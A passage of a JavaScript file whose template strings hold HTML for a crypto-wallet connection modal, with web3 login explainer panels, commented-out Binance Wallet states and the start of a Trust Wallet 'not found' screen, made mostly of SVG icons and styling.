                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M81 27C81 41.9117 68.9117 54 54 54C51.2722 54 48.6389 53.5955 46.1568 52.8432L36 63H27V72H18V81H4.5C2.01472 81 0 78.9853 0 76.5V64.864C0 63.6705 0.474103 62.5259 1.31802 61.682L28.1568 34.8432C27.4045 32.3611 27 29.7278 27 27C27 12.0883 39.0883 0 54 0C68.9117 0 81 12.0883 81 27ZM60.75 25.875C63.8566 25.875 66.375 23.3566 66.375 20.25C66.375 17.1434 63.8566 14.625 60.75 14.625C57.6434 14.625 55.125 17.1434 55.125 20.25C55.125 23.3566 57.6434 25.875 60.75 25.875Z" fill="url(#paint1_radial_2509_6177)" fill-opacity="0.2"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M44.5658 51.2522C45.1527 50.6653 46.0151 50.4492 46.8095 50.6899C49.0823 51.3788 51.4958 51.75 54 51.75C67.6691 51.75 78.75 40.669 78.75 27C78.75 13.331 67.6691 2.25 54 2.25C40.331 2.25 29.25 13.331 29.25 27C29.25 29.5042 29.6212 31.9177 30.3101 34.1905C30.5508 34.9849 30.3347 35.8473 29.7478 36.4342L2.90901 63.273C2.48705 63.6949 2.25 64.2672 2.25 64.864V76.5C2.25 77.7426 3.25736 78.75 4.5 78.75H15.75V72C15.75 70.7574 16.7574 69.75 18 69.75H24.75V63C24.75 61.7574 25.7574 60.75 27 60.75H35.068L44.5658 51.2522ZM36 63H27V72H18V81H4.5C2.01472 81 0 78.9853 0 76.5V64.864C0 63.6705 0.474103 62.5259 1.31802 61.682L28.1568 34.8432C27.4045 32.3611 27 29.7278 27 27C27 12.0883 39.0883 0 54 0C68.9117 0 81 12.0883 81 27C81 41.9117 68.9117 54 54 54C51.2722 54 48.6389 53.5955 46.1568 52.8432L36 63ZM68.625 20.25C68.625 24.5992 65.0992 28.125 60.75 28.125C56.4008 28.125 52.875 24.5992 52.875 20.25C52.875 15.9008 56.4008 12.375 60.75 12.375C65.0992 12.375 68.625 15.9008 68.625 20.25ZM66.375 20.25C66.375 23.3566 63.8566 25.875 60.75 25.875C57.6434 25.875 55.125 23.3566 55.125 20.25C55.125 17.1434 57.6434 14.625 60.75 14.625C63.8566 14.625 66.375 17.1434 66.375 20.25Z" fill="black" fill-opacity="0.1"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M33.4205 47.5795C33.8598 48.0188 33.8598 48.7312 33.4205 49.1705L3.0455 79.5455C2.60616 79.9848 1.89384 79.9848 1.4545 79.5455C1.01517 79.1062 1.01517 78.3938 1.4545 77.9545L31.8295 47.5795C32.2688 47.1402 32.9812 47.1402 33.4205 47.5795Z" fill="#A5A9AD"></path>
                                                        <defs>
                                                            <linearGradient id="paint0_linear_2509_6177" x1="72" y1="5.625" x2="2.25" y2="78.75" gradientUnits="userSpaceOnUse">
                                                                <stop stop-color="#D4DFE6"></stop>
                                                                <stop offset="0.0967282" stop-color="#C6CACD"></stop>
                                                                <stop offset="0.526645" stop-color="#BDBAC4"></stop>
                                                                <stop offset="1" stop-color="#939CA1"></stop>
                                                            </linearGradient>
                                                            <radialGradient id="paint1_radial_2509_6177" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(52.875 12.375) rotate(93.2705) scale(39.4392)">
                                                                <stop stop-color="white"></stop>
                                                                <stop offset="1" stop-color="white"></stop>
                                                            </radialGradient>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="sc-iBkjds emnDjo" data-projection-id="304" style="gap: 8px; padding-bottom: 0px;">
                                        <h1 class="sc-ftvSup fEIqVI" data-projection-id="306">A better way to login<br></h1>
                                        <div class="sc-papXJ jCcNJP">With modern apps, your wallet can be used as an easy way to login, instead of having to remember a password.<br></div>
                                    </div>
                                </div>
                                <div class="sc-efBctP cVqqga" data-projection-id="308">
                                    <div class="sc-bZnhIo haLOJ">
                                        <div class="sc-jdAMXn" data-projection-id="310">
                                            <div data-projection-id="312" style="position: relative;">
                                                <div class="sc-kgUAyh casSyR" data-projection-id="314" style="z-index: 10; position: relative; width: 128px; height: 128px; transform: rotate(80deg) translateZ(0px);">
                                                    <div class="sc-hTtwUo gsQaVR" data-projection-id="316" style="overflow: hidden; background: var(--ck-graphic-globe-background, radial-gradient(
                                                        82.42% 82.42% at 50% 86.72%,
                                                        rgba(255, 255, 255, 0.2) 0%,
                                                        rgba(0, 0, 0, 0) 100%
                                                        ),
                                                        linear-gradient(180deg, #3897FB 0%, #5004F1 100%)); box-shadow: var(--ck-graphic-globe-box-shadow, 0px -6px 20px rgba(56, 151, 251, 0.23)); opacity: 1; transform: rotate(100deg) translateZ(0px);">
                                                        <div class="sc-cOFTSb fKvQar" data-projection-id="318" style="animation-play-state: paused;">
                                                            <svg width="128" height="128" viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                <g>
                                                                    <circle cx="30" cy="141" r="64" stroke="url(#networkRadialA-0.14414502765126813)" stroke-width="3"></circle>
                                                                    <circle cx="78.8515" cy="131.123" r="54.1005" transform="rotate(-37.4016 78.8515 131.123)" stroke="url(#networkRadialB-0.14414502765126813)" stroke-width="3"></circle>
                                                                    <circle cx="63.6053" cy="2.12794" r="50.8338" transform="rotate(134.702 63.6053 2.12794)" stroke="url(#networkRadialC-0.14414502765126813)" stroke-width="3"></circle>
                                                                    <circle cx="126.658" cy="56.6577" r="50.3433" transform="rotate(-105 126.658 56.6577)" stroke="url(#networkRadialD-0.14414502765126813)" stroke-width="3"></circle>
                                                                    <circle cx="13.6619" cy="18.9603" r="46.0247" transform="rotate(107.362 13.6619 18.9603)" stroke="url(#networkRadialE-0.14414502765126813)" stroke-width="3"></circle>
                                                                </g>
                                                                <defs>
                                                                    <radialGradient id="networkRadialA-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(60.5 84) rotate(104.668) scale(77.0097)">
                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>
                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>
                                                                    </radialGradient>
                                                                    <radialGradient id="networkRadialB-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(96.1805 81.6717) rotate(97.125) scale(64.7443)">
                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>
                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>
                                                                    </radialGradient>
                                                                    <radialGradient id="networkRadialC-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(96.3816 -36.4455) rotate(114.614) scale(57.7177)">
                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>
                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>
                                                                    </radialGradient>
                                                                    <radialGradient id="networkRadialD-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(137.86 7.73234) rotate(92.3288) scale(62.743)">
                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>
                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>
                                                                    </radialGradient>
                                                                    <radialGradient id="networkRadialE-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(35.3203 -21.566) rotate(104.513) scale(54.8617)">
                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>
                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>
                                                                    </radialGradient>
                                                                </defs>
                                                            </svg>
                                                        </div>
                                                    </div>
                                                    <div data-projection-id="320">
                                                        <div data-projection-id="322" style="position: absolute; inset: 0px; border-radius: 50%; box-shadow: 0 0 0 2px var(--ck-graphic-globe-lines, rgba(126, 112, 243, 1)); transform: scale(1.1) translateZ(0px);"></div>
                                                        <div data-projection-id="324" style="position: absolute; inset: 0px; border-radius: 50%; box-shadow: 0 0 0 2px var(--ck-graphic-globe-lines, rgba(126, 112, 243, 1)); opacity: 0.25; transform: scale(1.2) translateZ(0px);"></div>
                                                    </div>
                                                </div>
                                                <div data-projection-id="326" style="z-index: 12; border-radius: 50%; position: absolute; bottom: -4px; right: -4px; width: 54px; height: 54px; display: flex; align-items: center; justify-content: center; padding: 13px; background: var(--ck-graphic-compass-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-compass-box-shadow, 0px 2px 9px rgba(0, 0, 0, 0.15)); transform: none;">
                                                    <div class="sc-BeQoi lgfrNL" data-projection-id="328"></div>
                                                    <div data-projection-id="330" style="z-index: 2; position: absolute; transform: none;">
                                                        <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M17 34C26.3 34 34 26.2833 34 17C34 7.7 26.2833 0 16.9833 0C7.7 0 0 7.7 0 17C0 26.2833 7.71667 34 17 34ZM9.83333 25.6833C8.68333 26.2333 7.8 25.3333 8.33333 24.2L13.1667 14.3333C13.45 13.75 13.8167 13.3833 14.35 13.1333L24.1833 8.33333C25.4 7.75 26.25 8.65 25.6833 9.81667L20.8833 19.6667C20.6167 20.2 20.2333 20.6 19.6833 20.85L9.83333 25.6833ZM17.0167 19.1333C18.1833 19.1333 19.1333 18.1833 19.1333 17.0167C19.1333 15.85 18.1833 14.9167 17.0167 14.9167C15.8667 14.9167 14.9167 15.85 14.9167 17.0167C14.9167 18.1833 15.8667 19.1333 17.0167 19.1333Z" fill="var(--ck-graphic-compass-color, var(--ck-body-color))"></path>
                                                            <path d="M17 34C26.3 34 34 26.2833 34 17C34 7.7 26.2833 0 16.9833 0C7.7 0 0 7.7 0 17C0 26.2833 7.71667 34 17 34ZM9.83333 25.6833C8.68333 26.2333 7.8 25.3333 8.33333 24.2L13.1667 14.3333C13.45 13.75 13.8167 13.3833 14.35 13.1333L24.1833 8.33333C25.4 7.75 26.25 8.65 25.6833 9.81667L20.8833 19.6667C20.6167 20.2 20.2333 20.6 19.6833 20.85L9.83333 25.6833ZM17.0167 19.1333C18.1833 19.1333 19.1333 18.1833 19.1333 17.0167C19.1333 15.85 18.1833 14.9167 17.0167 14.9167C15.8667 14.9167 14.9167 15.85 14.9167 17.0167C14.9167 18.1833 15.8667 19.1333 17.0167 19.1333Z" fill="url(#ck-compass-gradient)"></path>
                                                            <defs>
                                                                <linearGradient id="ck-compass-gradient" x1="17" y1="0" x2="17" y2="34" gradientUnits="userSpaceOnUse">
                                                                    <stop stop-color="rgba(0,0,0,0)"></stop>
                                                                    <stop offset="1" stop-color="rgba(0,0,0,0.05)"></stop>
                                                                </linearGradient>
                                                            </defs>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="sc-iBkjds emnDjo" data-projection-id="332" style="gap: 8px; padding-bottom: 0px;">
                                        <h1 class="sc-ftvSup fEIqVI" data-projection-id="334">Explore the world of web3<br></h1>
                                        <div class="sc-papXJ jCcNJP">Your wallet is an essential utility that lets you explore and participate in the fast evolving world of web3.<br></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-hKMtZM dvERaj" data-projection-id="336">
                            <span>
                                <div class="sc-jOrMOR btBRWv"><button class="sc-dPyBCJ eNjCID"></button><button class="sc-dPyBCJ fmCqCa"></button><button class="sc-dPyBCJ fmCqCa"></button></div>
                            </span>
                        </div>
                        <a href="https://ethereum.org/en/wallets/find-wallet/" target="_blank" rel="noopener noreferrer" class="sc-himrzO eyWopv">
                            <span class="sc-gXmSlM CshDF">Learn More<br></span>
                            <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="2" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="2" stroke-linecap="round" class="sc-bZkfAO"></path>
                            </svg>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;
/*
const BinanceWalletModal = "BinanceWalletModal";
const BinanceNotFoundModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 407px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Binance Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg width="32" height="32" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" fill-rule="evenodd" clip-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"><g fill="#f0b90b"><path d="M20.245 0L9.634 6.125l3.901 2.262 6.71-3.862 6.71 3.862 3.902-2.262L20.245 0zm6.711 11.586l3.9 2.263v4.526l-6.71 3.862v7.724l-3.9 2.263-3.902-2.263v-7.724l-6.71-3.862v-4.526l3.901-2.263 6.71 3.863 6.71-3.863h.001z"/><path d="M30.857 21.573V26.1l-3.901 2.262v-4.525l3.9-2.263.001-.001z"/><path d="M26.916 31.56l6.71-3.862v-7.724l3.902-2.263v12.25l-10.611 6.125V31.56h-.001zm6.711-19.31l-3.902-2.263 3.902-2.263 3.9 2.263v4.525l-3.9 2.263V12.25zM16.344 37.724V33.2l3.901 2.263 3.902-2.263v4.525l-3.902 2.263-3.9-2.263-.001-.001zm-2.809-9.363L9.634 26.1v-4.526l3.901 2.263v4.525-.001zm6.71-16.111l-3.9-2.263 3.9-2.263 3.902 2.263-3.902 2.263zm-9.48-2.263l-3.9 2.263v4.525l-3.902-2.263V9.987l3.901-2.263 3.901 2.263z"/><path d="M2.963 17.711l3.901 2.263v7.724l6.71 3.862v4.526L2.963 29.96V17.71v.001z"/></g></svg>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Install Binance Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your Binance wallet,<br>install the browser extension.<br></div>
                                        </div>
                                        <button onClick="getBinance()" class="sc-himrzO eyWopv">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Get Binance Wallet</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>`;
const BinanceRequestingModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Binance Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg width="32" height="32" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" fill-rule="evenodd" clip-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"><g fill="#f0b90b"><path d="M20.245 0L9.634 6.125l3.901 2.262 6.71-3.862 6.71 3.862 3.902-2.262L20.245 0zm6.711 11.586l3.9 2.263v4.526l-6.71 3.862v7.724l-3.9 2.263-3.902-2.263v-7.724l-6.71-3.862v-4.526l3.901-2.263 6.71 3.863 6.71-3.863h.001z"/><path d="M30.857 21.573V26.1l-3.901 2.262v-4.525l3.9-2.263.001-.001z"/><path d="M26.916 31.56l6.71-3.862v-7.724l3.902-2.263v12.25l-10.611 6.125V31.56h-.001zm6.711-19.31l-3.902-2.263 3.902-2.263 3.9 2.263v4.525l-3.9 2.263V12.25zM16.344 37.724V33.2l3.901 2.263 3.902-2.263v4.525l-3.902 2.263-3.9-2.263-.001-.001zm-2.809-9.363L9.634 26.1v-4.526l3.901 2.263v4.525-.001zm6.71-16.111l-3.9-2.263 3.9-2.263 3.902 2.263-3.902 2.263zm-9.48-2.263l-3.9 2.263v4.525l-3.902-2.263V9.987l3.901-2.263 3.901 2.263z"/><path d="M2.963 17.711l3.901 2.263v7.724l6.71 3.862v4.526L2.963 29.96V17.71v.001z"/></g></svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq">
                                                <div class="sc-HzFiz dYEcPx" style="opacity: 1;">
                                                    <svg aria-hidden="true" width="102" height="102" viewBox="0 0 102 102" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M52 100C24.3858 100 2 77.6142 2 50" stroke="url(#paint0_linear_1943_4139)" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <defs>
                                                            <linearGradient id="paint0_linear_1943_4139" x1="2" y1="48.5" x2="53" y2="100" gradientUnits="userSpaceOnUse">
                                                                <stop stop-color="var(--ck-spinner-color)"></stop>
                                                                <stop offset="1" stop-color="var(--ck-spinner-color)" stop-opacity="0"></stop>
                                                            </linearGradient>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div style="padding-bottom: 28px;" class="sc-iBkjds emnDjo">
                                            <h1 class="sc-ftvSup fqLYro">Requesting Connection<br></h1>
                                            <div class="sc-papXJ jCcNJP">Open the Binance browser <br>extension to connect your wallet.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;
const BinanceRejectedModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Binance Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd bxwbBD">
                                        <button onclick="updatePage(BinanceWalletModal);" aria-label="Retry" class="sc-eKBdFk iGfDZB" style="opacity: 1; transform: none;">
                                            <div class="sc-bUbCnL ilqOAO">
                                                <div>
                                                    <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M32 16C32 24.8366 24.8366 32 16 32C7.16344 32 0 24.8366 0 16C0 7.16344 7.16344 0 16 0C24.8366 0 32 7.16344 32 16ZM24.5001 8.74263C25.0834 8.74263 25.5563 9.21551 25.5563 9.79883V14.5997C25.5563 15.183 25.0834 15.6559 24.5001 15.6559H19.6992C19.1159 15.6559 18.643 15.183 18.643 14.5997C18.643 14.0164 19.1159 13.5435 19.6992 13.5435H21.8378L20.071 11.8798C20.0632 11.8724 20.0555 11.865 20.048 11.8574C19.1061 10.915 17.8835 10.3042 16.5643 10.1171C15.2452 9.92999 13.9009 10.1767 12.7341 10.82C11.5674 11.4634 10.6413 12.4685 10.0955 13.684C9.54968 14.8994 9.41368 16.2593 9.70801 17.5588C10.0023 18.8583 10.711 20.0269 11.7273 20.8885C12.7436 21.7502 14.0124 22.2582 15.3425 22.336C16.6726 22.4138 17.9919 22.0572 19.1017 21.3199C19.5088 21.0495 19.8795 20.7333 20.2078 20.3793C20.6043 19.9515 21.2726 19.9262 21.7004 20.3228C22.1282 20.7194 22.1534 21.3876 21.7569 21.8154C21.3158 22.2912 20.8176 22.7161 20.2706 23.0795C18.7793 24.0702 17.0064 24.5493 15.2191 24.4448C13.4318 24.3402 11.7268 23.6576 10.3612 22.4998C8.9956 21.3419 8.0433 19.7716 7.6478 18.0254C7.2523 16.2793 7.43504 14.4519 8.16848 12.8186C8.90192 11.1854 10.1463 9.83471 11.7142 8.97021C13.282 8.10572 15.0884 7.77421 16.861 8.02565C18.6282 8.27631 20.2664 9.09278 21.5304 10.3525L23.4439 12.1544V9.79883C23.4439 9.21551 23.9168 8.74263 24.5001 8.74263Z" fill="currentColor"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                        </button>
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg width="32" height="32" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" fill-rule="evenodd" clip-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"><g fill="#f0b90b"><path d="M20.245 0L9.634 6.125l3.901 2.262 6.71-3.862 6.71 3.862 3.902-2.262L20.245 0zm6.711 11.586l3.9 2.263v4.526l-6.71 3.862v7.724l-3.9 2.263-3.902-2.263v-7.724l-6.71-3.862v-4.526l3.901-2.263 6.71 3.863 6.71-3.863h.001z"/><path d="M30.857 21.573V26.1l-3.901 2.262v-4.525l3.9-2.263.001-.001z"/><path d="M26.916 31.56l6.71-3.862v-7.724l3.902-2.263v12.25l-10.611 6.125V31.56h-.001zm6.711-19.31l-3.902-2.263 3.902-2.263 3.9 2.263v4.525l-3.9 2.263V12.25zM16.344 37.724V33.2l3.901 2.263 3.902-2.263v4.525l-3.902 2.263-3.9-2.263-.001-.001zm-2.809-9.363L9.634 26.1v-4.526l3.901 2.263v4.525-.001zm6.71-16.111l-3.9-2.263 3.9-2.263 3.902 2.263-3.902 2.263zm-9.48-2.263l-3.9 2.263v4.525l-3.902-2.263V9.987l3.901-2.263 3.901 2.263z"/><path d="M2.963 17.711l3.901 2.263v7.724l6.71 3.862v4.526L2.963 29.96V17.71v.001z"/></g></svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div style="padding-bottom: 28px;" class="sc-iBkjds emnDjo">
                                            <h1 class="sc-ftvSup fqLYro">Request Cancelled<br></h1>
                                            <div class="sc-papXJ jCcNJP">You cancelled the request.<br>Click above to try again.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;*/
const TrustWalletModal = "TrustWalletModal";
const TrustNotFoundModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 407px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Trust Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg width="1024" height="1024" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
